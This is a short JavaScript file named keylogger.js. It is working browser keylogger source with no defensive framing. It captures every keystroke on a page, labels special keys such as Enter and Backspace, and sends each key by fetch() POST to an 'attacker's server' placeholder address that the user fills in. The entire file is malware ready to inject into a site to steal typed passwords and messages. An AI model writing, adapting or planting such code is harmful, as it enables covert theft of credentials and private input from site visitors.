// keylogger.js 

document.addEventListener('keydown', function(event) {
    let key = event.key;

    // Handle special keys with descriptive tags
    if (key === ' ') {
        key = '[SPACE]';
    } else if (key === 'Enter') {
        key = '[ENTER]\n';
    } else if (key === 'Backspace') {
        key = '[BACKSPACE]';
    } else if (key === 'Shift') {
        key = '[SHIFT]';
    } else if (key === 'CapsLock') {
        key = '[CAPS]';
    } else if (key.length > 1) {
        // Optional: Catch other non-printable keys like 'Control', 'Alt'
        // and ignore them to keep the log clean. Comment out to log them.
        return;
    }

    // The attacker's server address.
    const attackerServer = 'http://<YOUR_IP>:<YOUR_PORT>/log'; // Make sure IP and PORT are correct

    fetch(attackerServer, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({ key: key }),
        mode: 'no-cors'
    });
});
